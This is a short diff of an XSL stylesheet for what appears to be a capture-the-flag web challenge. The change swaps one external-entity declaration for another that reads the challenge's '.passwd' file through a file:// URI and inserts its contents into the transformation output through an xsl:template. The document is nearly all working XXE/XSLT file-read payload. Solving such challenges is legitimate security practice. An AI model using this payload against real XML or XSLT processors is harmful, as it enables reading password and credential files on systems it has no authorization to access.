@@ -1,7 +1,10 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE request [
-  <!ENTITY include SYSTEM "/challenge/web-serveur/ch50/.passwd">
+<!DOCTYPE xsl:stylesheet[
+  <!ENTITY passwd SYSTEM "file:///challenge/web-serveur/ch50/.passwd">
 ]>
+<xsl:template match="/">
+  &passwd;
+</xsl:template>
 <html xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" xsl:version="1.0">
 <body style="font-family:Arial;font-size:10pt;background-color:#EEFFAA">
 <xsl:for-each select="beers/beer">
